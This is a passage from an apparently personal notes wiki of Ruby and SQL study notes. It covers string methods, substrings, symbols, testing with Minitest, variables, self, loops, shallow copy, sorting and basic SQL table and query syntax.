Given our new knowledge, let's check how the `delete` method works.

## The delete Method

The `delete` method works like the `count` method. It deletes the characters at
the intersection of both parameters:

```ruby
'panda'.delete('an')       # => pd
# Deletes characters 2, 3 and 5 (set A)
'panda'.delete('a')        # => pnd
# Deletes characters 2 and 5 (set B)
'panda'.delete('an', 'a')  # => pnd
# Deletes characters at the intersection of sets A and B (2 and 5)
```


===

<!-- Source: computing/software/ruby/ruby-string-gsub.md -->
<!-- URL: /computing/software/ruby/ruby-string-gsub -->
<!-- Title: Ruby’s gsub Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-string-gsub]], [[software/ruby/ruby-string-gsub]], [[ruby/ruby-string-gsub]], [[ruby-string-gsub]] -->

---
date: 2021-03-15T09:49
---

# Ruby's gsub Method

`String#gsub` method in Ruby returns a copy of the String object it is called
upon, with all occurences of _pattern_ (first argument) subsituted for the
second argument. The _pattern_ is usually a `Regexp`.

The _replacement_ can contains back-references (like `\1`) to the pattern's
capture groups.

```ruby
'son'.gsub(/[o]/, 'u')                   # => "sun"
'rhododendron'.gsub(/([aeiou])/, '<\1>') # => "rh<o>d<o>d<e>ndr<o>n"
```

A destructive version `String#gsub!`, which perform the substitutions in place,
is also available.


===

<!-- Source: computing/software/ruby/ruby-substrings.md -->
<!-- URL: /computing/software/ruby/ruby-substrings -->
<!-- Title: Substrings in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/ruby-substrings]], [[software/ruby/ruby-substrings]], [[ruby/ruby-substrings]], [[ruby-substrings]] -->

---
date: 2021-02-27T12:35
---

# Substrings in Ruby

There are different way to find every substrings from a string in Ruby. The
most straightforward way (in my opinion) is to call two `Integer#upto` method.

Let's say we want every substring of "amethyst". Using a multidimensional
Arrays, the result will look like the following:

```
[
  ["a", "m", "e", "t", "h", "y", "s", "t"],
  ["am", "me", "et", "th", "hy", "ys", "st"],
  ["ame", "met", "eth", "thy", "hys", "yst"],
  ["amet", "meth", "ethy", "thys", "hyst"],
  ["ameth", "methy", "ethys", "thyst"],
  ["amethy", "methys", "ethyst"],
  ["amethys", "methyst"],
  ["amethyst"]
]
```

From this result we see we need two numbers:

- A number to symbolize the length of the string
- A number to symbolize the position where to start in the string

The former is just a matter of looping from one (or whatever minimum length you
need) to the string number of characters (or, again, whatever the maximum
String length you need).

This can easily be done in Ruby:

```ruby
string = 'amethyst'

1.upto(string.length) do |chars_position|
  puts string[0...chars_position]
end
```

{.ui .info .message}
Note the use of the three dots (`...`): because Ruby uses 0 indexed
collections, we need not to include the last number. It would be possible to
use two dots and passing `-1` to method `upto` (`0.upto(string.length -1)`) to
achieve the same effect. This is hella ugly though.

For the second number, i.e. the number to symbolize the position where to start
in the string, we can once again use method `upto` to iterate over the string.
This time, we will use the parameter as the position in the string to start to.

```ruby
string = 'amethyst'

0.upto(string.length) do |starting_chars|
  puts string[starting_chars...-1]
end
```

---

Now we have a way to control the string's length and where we should start
iterating over it. Combining those two snippets of codes, we can create a
method to get every substrings, given a string (actually two methods for ease
of reading).

```ruby
def substrings_maker(str, substr_size)
  substr_collector = Array.new

  0.upto(str.length - substr_size) do |starting_chars|
    substr_collector <<  str[starting_chars...(starting_chars + substr_size)]
  end

  substr_collector
end

def find_all_substrings(str)
  substr_list = Array.new

  1.upto(str.length) do |chars_position|
    substr_list << substrings_maker(str, chars_position)
  end

  substr_list
end

violet_rock = 'amethyst'

puts find_all_substrings(violet_rock)
```

All of that to learn there is _meth_ in a_meth_yst!

## Practice Problems

- [[practice-problems-substrings]]#


===

<!-- Source: computing/software/ruby/ruby-symbol.md -->
<!-- URL: /computing/software/ruby/ruby-symbol -->
<!-- Title: Ruby’s Symbol -->
<!-- Wikilinks: [[computing/software/ruby/ruby-symbol]], [[software/ruby/ruby-symbol]], [[ruby/ruby-symbol]], [[ruby-symbol]] -->

---
date: 2021-06-17T09:26
---

# Ruby's Symbol

To iterate over a collection doing only one action, we can explicitly write
the action:

```ruby
[1, 2, 3, 4].map { |num| num.to_s }
```

Or we can pass `&:to_s` as an argument to the method instead of a block,
which is fundamentally the same thing:

```ruby
[1, 2, 3, 4].map(&:to_s)
```

We can see `&` in front of an object. This tells Ruby to try to convert
said object into a block. However it's expecting a Proc object therefore if
it's not a Proc object, Ruby will call `#to_proc` on the object.

What is happening here is:

- Ruby convert the object after `&` to a Proc with `#to_proc` if it is not
  one already. (An error is thrown if the object cannot be converted)
- If successful, `&` turns the `Proc` into a block.

The code bellow illustrates illustrates what is happening step by step:

```ruby
def my_method
  yield(2)
end

my_proc = :to_s.to_proc # Call `to_proc` on symbol `to_s`
my_method(&my_proc)     # Convert Proc into a block then pass to method
# => "2"
```


===

<!-- Source: computing/software/ruby/ruby-syntactical-sugar-pitfalls.md -->
<!-- URL: /computing/software/ruby/ruby-syntactical-sugar-pitfalls -->
<!-- Title: Ruby Syntactical Sugar Pitfalls -->
<!-- Wikilinks: [[computing/software/ruby/ruby-syntactical-sugar-pitfalls]], [[software/ruby/ruby-syntactical-sugar-pitfalls]], [[ruby/ruby-syntactical-sugar-pitfalls]], [[ruby-syntactical-sugar-pitfalls]] -->

---
date: 2020-09-20T17:07
---

# Ruby Syntactical Sugar Pitfalls

Ruby hides away under the hood a lot of writting which are common in other
languages. One benefit is easier and faster writting, and (generally) easier
parsing of the code.

There are some pitfalls to this syntactical sugar.

Local Variable and Method with the Same Name
--------------------------------------------

Say we have a code with a variable and a method of the same name:

```ruby
stringify = 'a string'

def stringify
  'a method'
end

p stringify # => "a string"
```

It seems that when a method and a variable have the same name, Ruby prioritizes
the variable over the method invocation. This is actually not the case.

What happen is we asked Ruby to print the variable `stringify`. If we wanted to
invoke the method, we would need to use:

```ruby
p stringify() # => "a method"
```

Like a lot of other programming language, Ruby uses the syntax `method_name` +
`()` to invoke a method. **This syntax can be shortcut to `method_name`
if and only if there is no method with the same name.**

Most of the time though, our code will use the shortcut writting. It's best to
avoid this problem altogether and use different names for our methods and our
variables.

Using Too Much Syntax Shortcut
------------------------------

Taking the same example as above, what we are actually trying to do is:

```ruby
p(stringify()) # => "a method"
```

While `p stringify` is easier to read (closer to English), it does not tell you
if `stringify` is a method or a variable.

Counsciously writting parenthesis aroud method, like `p(stringify)`, while
slightly more difficult to parse, is more straightforward: we are using the
method `p()` on a variable `stringify`.

Syntax Error
------------

With ternary operator we cannot take advantage of Ruby's syntactical sugar:

```ruby
boolean = [true, false].sample
boolean ? puts "I'm true!" : puts "I'm false!"
```

The code aboce would result in a `SyntaxError`:

```
syntax error, unexpected string literal, expecting `do' or '{' or '(')
```

The error tells use we have to add parentheses around the argument:

```ruby
boolean ? puts("I'm true!") : puts("I'm false!")
```


===

<!-- Source: computing/software/ruby/ruby-ternary-operator.md -->
<!-- URL: /computing/software/ruby/ruby-ternary-operator -->
<!-- Title: Ruby’s Ternary Operator -->
<!-- Wikilinks: [[computing/software/ruby/ruby-ternary-operator]], [[software/ruby/ruby-ternary-operator]], [[ruby/ruby-ternary-operator]], [[ruby-ternary-operator]] -->

---
date: 2021-03-16T20:13
---

# Ruby's Ternary Operator

For short and concise conditional `if` statement, one can use the **ternary
operator**.

A ternary **operation** is a
[_n_-ary](https://en.wikipedia.org/wiki/Arity)operation with `n = 3`.

A ternary **operator** is an operator that takes three arguments.

```ruby
condition ? "Result if condition is true" : "Result if condition is false"
#   ^                   ^                               ^
#   |                   |                               |
#   |                   |                               |
# First argument   Second argument                Third argument
```

If the first argument, `condition` to the left of `?`, evaluates to true, the
second argument, to the left of `:`, is returned. Otherwise, the third
argument, to the right of `:`, is returned.

Ternary operator are preferred when two possibilities of result and only one
operation is returned for each possibilities. Otherwise a classif `if..else`
statement is to be preferred.


===

<!-- Source: computing/software/ruby/search-replace-ruby.md -->
<!-- URL: /computing/software/ruby/search-replace-ruby -->
<!-- Title: Search and Replace in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/search-replace-ruby]], [[software/ruby/search-replace-ruby]], [[ruby/search-replace-ruby]], [[search-replace-ruby]] -->

---
date: 2020-08-23T11:54
tags:
  - ruby
---

# Search and Replace in Ruby

I tend to forgot about the existence of `gsub` when I try to perform a search
and replace action in Ruby.

This note is in order to remember about `gsub` existence. That's it.

`sub` only replaces the _first_ occurrence of the given pattern, while `gsub`
replaces _every_ occurrence.


===

<!-- Source: computing/software/ruby/split-string-into-characters.md -->
<!-- URL: /computing/software/ruby/split-string-into-characters -->
<!-- Title: Split String into Characters -->
<!-- Wikilinks: [[computing/software/ruby/split-string-into-characters]], [[software/ruby/split-string-into-characters]], [[ruby/split-string-into-characters]], [[split-string-into-characters]] -->

---
date: 2020-08-03
tags:
  - ruby/memo
---

# Split String into Characters

Three ways to do it:

```ruby
irb(main):001:0> str = 'this string'
irb(main):002:0> str.each_char.to_a
=> ["t", "h", "i", "s", " ", "s", "t", "r", "i", "n", "g"]
irb(main):003:0> str.split('')
=> ["t", "h", "i", "s", " ", "s", "t", "r", "i", "n", "g"]
irb(main):004:0> str.chars
=> ["t", "h", "i", "s", " ", "s", "t", "r", "i", "n", "g"]
```


===

<!-- Source: computing/software/ruby/testing-with-ruby.md -->
<!-- URL: /computing/software/ruby/testing-with-ruby -->
<!-- Title: Testing with Ruby -->
<!-- Wikilinks: [[computing/software/ruby/testing-with-ruby]], [[software/ruby/testing-with-ruby]], [[ruby/testing-with-ruby]], [[testing-with-ruby]] -->

---
date: 2021-06-22T08:03
---

# Testing with Ruby

Testing with Ruby is often done with RSpec, but Minitest is the default
testing library. Functionality wise, both can do the same things but
Minitest has a more straight forward (Ruby-like) syntax while RSpec is
closer to natural English. Rspec is a _Domain Specific Language_ (DSL).

## Vocabulary of Testing

- **Test Suite**: the entire set of test for a program.
- **Test**: the situation or context in which tests are run. A test can
  contain multiple assertions.
- **Assertion**: the actual verification step; what is done to confirm that
  the data returned is what was expected.

## Autopsy of a Test File

Assuming a `Flamingo` class with an instance variable `wings` which points
to integer object `2`, we can write the following test:

```ruby
require 'minitest/autorun'          # loads files from `minitest` gem

require_relative 'flamingo'         # name of the file we're testing
                                    # `require_relative` means from the
                                    # current file's directory

class FlamingoTest < MiniTest::Test # need to be a subclass of
                                    # `MiniTest::Test` to inherit test
                                    # methods
  def test_wings                    # each test has its own instance method
                                    # that starts with `test_`
    flamingo = Flamingo.new
    assert_equal(2, flamingo.wings) # the actual assertion
  end
end
```

## Test Output

On our above file, the output would be something like this:

```
Run options: --seed 57527

# Running:

.

Finished in 0.000684s, 1461.4371 runs/s, 1461.4371 assertions/s.

1 runs, 1 assertions, 0 failures, 0 errors, 0 skips
```

The dot `.` represents one successfully ran test. When skipped or failed,
this dot became a `S` or a `F`, respectively.

`seed` tells the order the tests were run in. With multiple tests run in
random order, having a seed can help reproduce a bug which only happens
when tests are run in a particular order. To rerun the test in the same
order, we can append `--seed 57527` to our command.

## Assertions

The example above used a straight forward assertion: the one for equality.
There are other type of assertion, actually too much to list them all. They
can be seen on [this
page](https://docs.seattlerb.org/minitest/Minitest/Assertions.html).

The most common ones are written below:

- `assert(test)`: test for truthiness
- `assert_equal(exp, act)`: test for equality of `exp` and `act`
- `assert_nil(obj)`: test for `nil`
- `assert_raises(*exp) { ... }`: test for block raise of `*exp`
- `assert_instance_of(cls, obj)`: test for instance of class `cls`
- `assert_includes(collection, obj)`: test for inclusion of `obj` in
  `collection`

Most `assert` (and `refute`, see below) methods accept a message argument,
with an exception for `assert_mock`, `assert_raises` and `assert_silent`.

## Refutations

Refutation are the opposite of assertions: they _refute_ instead of
_assert_. So for example, `refute(test)` check for falsiness, `refute_nil`
test for _not_ `nil` etc.

## Setup and Teardown

To perform or run actions before or after each test, Minitest provides both
`setup` and `teardown` methods. Each class that defines a test suite can
have those two methods.

See also the #[[seat-approach]].

`setup` is often used to perform setup and requirements before each test.
`teardown` is called for any required cleanup. This is often use to
connect/disconnect to a database, for example.

Both methods are optional and independent: we can have both, neither or
one of the two.

```ruby
class DatabaseTest < Minitest::Test
  def setup
    @myapp = MyApp.new
  end

  def test_something
    # perform some test
  end

  def test_something_else
    # perform some test
  end

  def teardown
    @myapp.cleanup
  end
end
```

Prior to `test_something` and `test_something_else`, `setup` creates a
`@myapp` instance variable. After each test, `teardown` calls
`@myapp.cleanup` which does whatever is useful for `MyApp` class.


===

<!-- Source: computing/software/ruby/type-of-variables.md -->
<!-- URL: /computing/software/ruby/type-of-variables -->
<!-- Title: Type of Variables -->
<!-- Wikilinks: [[computing/software/ruby/type-of-variables]], [[software/ruby/type-of-variables]], [[ruby/type-of-variables]], [[type-of-variables]] -->

---
date: 2021-04-04T14:40
---

# Type of Variables

## Local Variables

See [[variables-as-pointers]] and [[local-variable-scope]].

## Instance Variables

An instance variable is a variable that exists as long as the object instance
it is scoped to exists. We use instance variable to tie data to objects.

Note however that will they are initialized in a constructor, instance
variables do not disapear after the constructor is run. They are scoped to the
object instance and lives on with it.

In Ruby, instance variable are written with an at sign (`@`) inside the
`initialize` method definition (the constructor):

```ruby
class Flamingo
  def initialize
    @color = 'pink'
  end
end

chilean_flamingo = Flamingo.new
```

## Class Variables

Above we saw that instance variable capture information related to the specific
instance of classes. **Class variables** are to classes what instance variables
are to instance. Class variables are used to keep track of informations that
relates to the class and not the instances. One example would be to track the
number of time a new object is instantiated.

```ruby
class Flamingo
  @@flock = 0

  def initialize
    @@flock += 1
  end

  def self.number_of_flamingos
    @@flock
  end
end

puts Flamingo.number_of_flamingos  # => 0

chilean_flamingo = Flamingo.new
greater_flamingo = Flamingo.new

puts Flamingo.number_of_flamingos  # => 2
```

## Constants

Constants are variables that never change. In Ruby, the first letter should be
capitalized, although most Rubyists uppercase the whole word.

```ruby
CORONATION_OF_NAPOELON_I = 1804
```


===

<!-- Source: computing/software/ruby/what-is-self-ruby.md -->
<!-- URL: /computing/software/ruby/what-is-self-ruby -->
<!-- Title: What is self in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/what-is-self-ruby]], [[software/ruby/what-is-self-ruby]], [[ruby/what-is-self-ruby]], [[what-is-self-ruby]] -->

---
date: 2021-05-18T07:32
---

# What is self in Ruby

Object Oriented Programing introduce a new keyword `self`. This keyword is
used in different context.

## Calling Methods with self

A classic error made when learning to use classes and instance methods is
to assign new value to a newly initialized local variable instead of the
_setter_ method.

```ruby
class Obake
  def initialize(name, age)
    @name = name
    @age = age
  end

  def change_info(name, age)
    name = name
    age = age
  end

  private

  attr_accessor :name, :age
end
```

We know we need _setter_ methods (provided by `attr_accessor`) to modify
the `@name` and `@age` instance variables. However, in the `change_info`
method we are not calling those two _setter_ methods. Instead, we are
initializing new local variable `name` and `age`. As thoses are scoped to
the method scope (see also [[local-variable-scope]]), they cease to exist when the
method returns.

What we really want to do is reassign the instance variables using
_setter_ methods. This can be done thanks to `self` to let Ruby know we're
calling a method:

```ruby
class Obake
  def initialize(name, age)
    @name = name
    @age = age
  end

  def change_info(name, age)
    self.name = name
    self.age = age
  end

  private

  attr_accessor :name, :age
end
```

It is possible, though not required, to use `self` on _getter_ methods as
well. Rubocop will probably flag it:

```
C: Style/RedundantSelf: Redundant self detected. (https://github.com/bbatsov/ruby-style-guide#no-self-unless-required)
    "My name is #{self.name} and I am #{self.age}!"
                  ^^^^^^^^^
C: Style/RedundantSelf: Redundant self detected. (https://github.com/bbatsov/ruby-style-guide#no-self-unless-required)
    "My name is #{self.name} and I am #{self.age}!"
                                        ^^^^^^^^
```

Last but not least, we can use `self` on any instance method, not just
accessor methods.

## Method Definitions with self

`self` is used to define _class methods_. See
[[instance-methods-vs-class-methods]]#.

Using `self` inside a class but outside an instance method refers to the
class itself.

```ruby
class Obake
  puts "I am a good #{self}."
end

Obake  # => I am a good Obake.
```

From the example above, we can see how a method defined using `self` is a
class method: `def self.my_method` is the same as `def Obake.my_method`.

## Referencing the Calling Object

Imagine a method `what_is_self` that returns `self`:

```ruby
class Obake
  attr_accessor :name, :age

  def initialize(name, age)
    @name = name
    @age = age
  end

  def what_is_self
    self
  end
end

tommy = Obake.new('Tommy', 204)
arthur = Obake.new('Arthur', 340)

p tommy.what_is_self  # => #<Obake:0x000055f7cf7da3a8 @name="Tommy", @age=204>
p arthur.what_is_self # => #<Obake:0x000055f7cf7da330 @name="Arthur", @age=340>
```

We can see that from within the class, when an instance method uses `self`
it reference the _calling object_. In this case it's the `tommy` and
`arthur` objects.

This means calling `self.name=` (`name=` being the setter method)
**inside** an instance method acts the same as calling `tommy.name=` from
**outside** the class.

{.ui .message .info}
`tommy.name=` cannot be called inside the class as the object `tommy` is
not in scope.


===

<!-- Source: computing/software/ruby/while-until-for-loop.md -->
<!-- URL: /computing/software/ruby/while-until-for-loop -->
<!-- Title: while, until and for Loop -->
<!-- Wikilinks: [[computing/software/ruby/while-until-for-loop]], [[software/ruby/while-until-for-loop]], [[ruby/while-until-for-loop]], [[while-until-for-loop]] -->

---
date: 2021-03-16T08:40
---

# while, until and for Loop

## while Loop

In Ruby, `while` is a [keyword](https://ruby-doc.org/docs/keywords/1.9/). It
takes a condition argument and executes the code inside the delimiter _while_
the condition is true.

Like method, `while` returns the last expression evaluated in its code. If
`while` is not executed (the condition is `false` at the beginning), it
evaluates to `nil`.

```ruby
i = 0

while i < 5
  i += 1
  p i
end
```

## until Loop

The `until` loop is the inverse of `while`: it takes a condition argument and
executes the code inside the delimiter _while_ the condition is false (_until_
the condition is true).

```ruby
i = 10

until i < 5
  i -= 1
  p i
end
```

## for Loop

One of the most used loop in programming, but in the Ruby world `for` is
generally considered less idiomatic than the `each` method.

```ruby
for num in [1, 2, 3, 4, 5] do
  puts num * 10
end
```


===

<!-- Source: computing/software/seat-approach.md -->
<!-- URL: /computing/software/seat-approach -->
<!-- Title: SEAT Approach -->
<!-- Wikilinks: [[computing/software/seat-approach]], [[software/seat-approach]], [[seat-approach]] -->

---
date: 2021-06-25T09:03
---

# SEAT Approach

In order to make test and assert results, a lot of redundant steps have to
occur. This is especially a problem for big projects with a lot of test
and expensive processes such as retrieving data from a database.

One way to approach writing a test is to use the 4 steps SEAT approach:

1. **S**et up the necessary objects
2. **E**xecute the code against the object we're testing
3. **A**ssert the results of the execution
4. **T**ear down and clean up any lingering artifacts

The first and last step are special methods that are called before and
after running every test. Setup is useful for, for example, instancing an
object that will be used all along the test. Tear down can help cleanup
after the test (cleaning up files, closing database connections etc).


===

<!-- Source: computing/software/shallow-copy.md -->
<!-- URL: /computing/software/shallow-copy -->
<!-- Title: Shallow Copy -->
<!-- Wikilinks: [[computing/software/shallow-copy]], [[software/shallow-copy]], [[shallow-copy]] -->

---
date: 2020-08-09
tags:
  - programming
---

# Shallow Copy

A _shallow copy_ of an object is a copy of the collection structure, not its
elements. In other word: if the object contains other objects, those won't be
copied and will be _shared_ instead[^1].

In contrast, a _deep copy_ copies everything.


## Example in Ruby

{.ui .info .message}
Ruby only provides method to perform Shallow Copy. There is no built-in way to
create a deep copy.

```ruby
arr1 = ["flamingo", "capybara", "red panda"]
arr2 = arr1.dup
arr2[0].upcase!

arr2 # => ["FLAMINGO", "capybara", "red panda"]
arr2 # => ["FLAMINGO", "capybara", "red panda"]
```

In this example, both array are modified because the method `String#upcase!`
was called on the object within the array (the string `flamingo`) rather than
the array itself. As the String object is shared between the original `arr1`
and the copy `arr2`, and the method called is destructive, its effect can be
seen on both collection.


[^1]: [Object copying](https://en.wikipedia.org/wiki/Object_copying#Shallow_copy)


===

<!-- Source: computing/software/software-architecture.md -->
<!-- URL: /computing/software/software-architecture -->
<!-- Title: Software Architecture -->
<!-- Wikilinks: [[computing/software/software-architecture]], [[software/software-architecture]], [[software-architecture]] -->

---
date: 2021-12-18T16:42
---

Software Architecture
=====================

-   [[microservices]]#


===

<!-- Source: computing/software/sorting-of-arrays.md -->
<!-- URL: /computing/software/sorting-of-arrays -->
<!-- Title: Sorting of Arrays -->
<!-- Wikilinks: [[computing/software/sorting-of-arrays]], [[software/sorting-of-arrays]], [[sorting-of-arrays]] -->

---
date: 2021-02-17T09:41
---

# Sorting of Arrays

Sorting is the _comparison_ of two elements by a specific criterion. This
criterion is by default provided by Ruby but can be defined by the programmer.

## The `<=>` Operator

The `<=>` operator compares two values _of the same type_ and returns `-1`,
`0` or `1`, respectively if the object on the left is **less than**, **equal**
or **greater** than the object on the right. If two objects cannot be compared
(are not of the same type), `nil` is returned.


```ruby
  2 <=> 1   # => 1
  1 <=> 2   # => -1
  2 <=> 2   # => 0
'b' <=> 'a' # => 1
'a' <=> 'b' # => -1
'b' <=> 'b' # => 0
  1 <=> 'a' # => nil
```

## Sorting Order

`Integer` objects are sorted in ascending order.

`String` objects are sorted using the ASCII table. In the ASCII table, the
following rules apply:

-  Uppercase letters before lowercase letters
-  Digits and most punctuation before letters
-  _Extended_ ASCII table after the main ASCII table

Multi-character strings are compared character by character.


===

<!-- Source: computing/software/sql.md -->
<!-- URL: /computing/software/sql -->
<!-- Title: Structured Query Language (SQL) -->
<!-- Wikilinks: [[computing/software/sql]], [[software/sql]], [[sql]] -->

---
date: 2022-03-25T12:57
---

Structured Query Language (SQL)
===============================

SQL, meaning **S**tructured **Q**uery **L**anguage, is a programming
language used to communicate with a relational database.

It uses simple English sentences that allow to `SELECT` (find), `INSERT`
(add), `UPDATE` (change) or `DELETE` (remove) data.

SQL is a *declarative* language: in a SQL statement you describe
**what** needs to be done, but not **how** to do it; the later, as well
as the execution, is handled by the
[[relational-database-management-system]]#.

SQL Sub-Languages
-----------------

One can think of SQL as three separate sub-languages which their
specificities:

-   **DDL: Data Definition Language**: define the structure of a
    database and the tables and columns within it
-   **DML: Data Manipulation Language**: retrieve or modify data stored
    in a database (ex: `SELECT` queries)
-   **DCL: Data Control Language**: determine what various users are
    allowed to do when interacting with a database, in other words, the
    "security" of a database

[Source](https://launchschool.com/books/sql/read/interacting_with_postgresql)

Data vs Schema
--------------

A RDBMS such as [[postgresql]] knows how to interpret the syntax of
an SQL statement thanks to the role that data and schema plays in a
database.

**Schema** relates to the *structure* of a database, such as the name of
a table and its columns, data types etc.

**Data** relates to the *contents* of a database, i.e., the actual
values associated with rows and columns in a database table.

The combination of the two is what creates the structured data that we
can interact with.

[Source](https://launchschool.com/books/sql/read/basics_tutorial)

Convention
----------

SQL is case-insensitive, meaning it doesn't care if its statement is
written in lowercase or uppercase. This is not true for data, though.

The convention is to use uppercase for commands and lowercase for names,
for clarity.

### Database Naming

Database names shall be self-descriptive, no abbreviation nor acronym,
and names shall be written in snake\_case.

SQL Tables
----------

Tables, sometimes called *relations* and the relationships between those
are what provide structure to our data. Data are saved in the columns of
our table.

Tables can be used to represent real world abstractions of business
logic, such as customer or an order.

A basic table is create with the following statement:

``` sql
CREATE TABLE table_name (
  column_1_name column_1_data_type [constraints, ...],
  column_2_name column_2_data_type [constraints, ...],
  -- ...
);
```

Each line (finished by a coma `,`) represents one column of our table.
The first part is the name of the column. Except for the convention
described above, there is nothing particular to be aware of. The second
part is the data type of the column (see below). The third part is one
or more constraints (optional).

### Data Types

A data type describes the values that is allowed for that column of the
table. It's both for organization and for protection of the database (to
refrain from entering invalid type). Commons data types are described
below:

| Data Type                   | Description                                                                                           |
|-----------------------------|-------------------------------------------------------------------------------------------------------|
| `serial`                    | (Deprecated) Create identifier columns `id` (non-null auto-incrementing integer) for the database     |
| `IDENTITY`                  | New feature replacing `serial`[^1]                                                                    |
| `char(N)`                   | Column can only contain a string of `N` characters in length (remaining filled with space characters) |
| `varchar(N)`                | Same as `char(N)` without the constrain of remaining string length                                    |
| `boolean`                   | Boolean data type (`true` / `false`, or `t` / `f` in PostgreSQL                                       |
| `integer` or `INT`          | Integer data type                                                                                     |
| `decimal(precision, scale)` | Decimal number with a total digits of `precision` and total digits in the fractional part of `scale`  |
| `timestamp`                 | Date and tie in `YYYY-MM-DD HH:MM:SS` format                                                          |
| `date`                      | Date without the time                                                                                 |

### Constraints

Constraints are rules to put on columns in order to define what data
values are allowed. While optional, most of the time it is recommended
to add them as it helps maintaining the integrity and quality of the
data that the column is storing.

Often used constraints include:

| Constraints   | Description                                                                      |
|---------------|----------------------------------------------------------------------------------|
| `UNIQUE`      | Prevents duplicate value in that column                                          |
| `NOT NULL`    | Cannot be left empty                                                             |
| `DEFAULT foo` | If no value is set at creation time, default value of `foo` is set in that field |

### Alter a Table

One can modify a table using the `ALTER TABLE` statement. The syntax is
as follows:

``` sql
ALTER TABLE
  table_name
  modify_clause
  arguments;
```

To rename a **table**, one can use the following:

``` sql
ALTER TABLE
  foo RENAME TO bar;
```

To rename a **column**, one can use the following:

``` sql
ALTER TABLE
  bar RENAME COLUMN foobar TO barfoo;
```

#### Alter a Column's Datatype

To alter a column's datatype, one can use `ALTER COLUMN` in conjunction
with `ALTER TABLE`:

``` sql
ALTER TABLE
  bar
ALTER COLUMN
  barfoo TYPE char(10);
```

#### Adding/Removing Constraints

Constraints are added/removed rather than changed. This is because you
can have several constraints in a column.

``` sql
ALTER TABLE
  bar
ADD
  [CONSTRAINT constraint_name]
  constraint_clause;
```

{.ui .info .message}
`constraint_name` is optional, as indicated by the brackets.

Depending on the type of constraint, the syntax can vary. This is true
for so called "table constraints" and "column constraints".

The difference is mainly syntactic.

`NOT NULL` for example is always a column constraint, which is why it
has its special command for adding constraint to an existing table:

``` sql
ALTER TABLE
  bar
ALTER COLUMN
  barfoo
SET
  NOT NULL;
```

To remove a constraint, we use the following syntax:

``` sql
ALTER TABLE
  bar DROP CONSTRAINT constraint_name;
```

To drop the `DEFAULT` clause on data type `serial`, we use the
following:

``` sql
ALTER TABLE
  bar
ALTER COLUMN
  id DROP DEFAULT;
```

### Adding/Removing a Column

The syntax is the `ADD COLUMN` clause to `ALTER TABLE` statement:

``` sql
ALTER TABLE
  bar
ADD
  COLUMN last_login timestamp NOT NULL DEFAULT NOW();
```

Removing a column uses `DROP COLUMN`:

``` sql
ALTER TABLE
  bar DROP COLUMN piyo;
```

### Dropping Tables

This dangerous action can be done with the following command:

``` sql
DROP TABLE bar;
```

{.ui .warning .message}
This action is irreversible.

[Source](https://launchschool.com/books/sql/read/alter_table)

Data
----

### Insertion Statement Syntax

The most basic insertion statement is as follows:

``` sql
INSERT INTO
  table_name (column1_name, column2_name,...)
VALUES
  (data_for_column1, data_for_column2,...);
```

Three pieces of information are to be provided:

1.  The table name
2.  The columns' names
3.  The values to be stored in each columns

Will columns' names can be omitted under certain conditions, it's
generally best to write both the column and its data to avoid error down
the road.

A successful insertion will produce the following result (meaning is in
comment):

``` txt
INSERT 0 1
--     |  \
--    oid  |
--       count
```

To insert several data sequentially in one command, you can separate
each row with a comma `,`:

``` sql
INSERT INTO
  table_name (column1_name, column2_name,...)
VALUES
  (data_for_column1, data_for_column2,...),
  (data_for_column1, data_for_column2,...);
```

[Source](https://launchschool.com/books/sql/read/add_data)

Select Query Syntax
-------------------

The basic syntax is as follow:

``` sql
SELECT
  column_name,
  ...
FROM
  table_name
WHERE
  condition
[ORDER BY
  column_name [ASC]];
```

{.ui .info .message}
RDBMS treats everything that is not a keyword (`SELECT`, `FROM` etc) as
an identifiers. Case does not matter, therefore `SELECT` and `select`
are treated the same. Generally it is best to avoid using reserved
keywords as identifiers, like `year`. However, if it 's not possible,
using double quote `"year"` lets the RDBMS knows the statement should be
treated specifically as an identifier rather than a keyword.

### Comparison Operators

List of often used operators:

| Operator     | Description              |
|--------------|--------------------------|
| `<`          | less than                |
| `>`          | greater than             |
| `<=`         | less than or equal to    |
| `>=`         | greater than or equal to |
| `=`          | equal                    |
| `<>` or `!=` | not equal                |

There are also *comparison predicates* that have a special syntax:

| Comparison Predicates  | Description            |
|------------------------|------------------------|
| `BETWEEN`              | between two values     |
| `NOT BETWEEN`          | not between two values |
| `IS DISTINCT FROM`     | is distinct from       |
| `IS NOT DISTINCT FROM` | is not distinct from   |
| `IS NULL`              | is null                |
| `IS NOT NULL`          | is not null            |

`NULL` is a special value in SQL. Although it is a value, it cannot be
used for selection like `WHERE column_name = NULL`. Instead, we use
`WHERE column_name IS NULL`.

### Logical Operators

There are three:

1.  `AND`
2.  `OR`
3.  `NOT`

There use with `WHERE` clause are pretty self-explanatory, for example
with `OR`:

``` sql
SELECT
  column_name
FROM
  table_name
WHERE
  condition
  OR other_condition;
```

### String Matching Operators

String or pattern matching allows to conditionally search fro string
patterns. We use `LIKE` (case-sensitive) and `ILIKE` (case-insensitive):

``` sql
SELECT
  column_name
FROM
  table_name
WHERE
  condition LIKE '%foo';
```

Percentage `%` is the wildcard character for *any number* of characters.
For one character, we can use underscore `_` instead.

There is also a `SIMILAR TO` that works like `LIKE` but for regular
expression pattern.

`LIMIT` and `OFFSET`
--------------------

`SELECT` statements are great to return all kind of results. However
when there are a lot of results to display, it is generally better to
separate the data by "pages". This is called "pagination".

For example, to limit the selection to 1 user, we can use the following
statement:

``` sql
SELECT
  *
FROM
  users
LIMIT
  1;
```

This statement limits the selection to the first row of the table. If we
wanted to skip the first result and only return the second row, we can
use `OFFSET`:

``` sql
SELECT
  *
FROM
  users
LIMIT
  1 OFFSET 1;
```

This would return the second row, and only the second row

`DISTINCT`
----------

When joining multiple table, one thing that can often happens is data
duplication. The `DISTINCT` qualifier helps up remediate to this
problem.

``` sql
SELECT
  DISTINCT full_name
FROM
  users;
```

SQL Functions
-------------

Functions performs operation on fields or data and return the result, or
perform a transformations.

[^1]: [PostgreSQL Don't Do
    This](https://wiki.postgresql.org/wiki/Don%27t_Do_This#Don.27t_use_serial)


===

<!-- Source: computing/software/svg-optimization.md -->
<!-- URL: /computing/software/svg-optimization -->
<!-- Title: SVG optimization -->
<!-- Wikilinks: [[computing/software/svg-optimization]], [[software/svg-optimization]], [[svg-optimization]] -->

---
date: 2020-08-17
tags:
  - tool
---

# SVG optimization

SVG is a great XML-based vector image format. Unfortunately a lot of tool don't
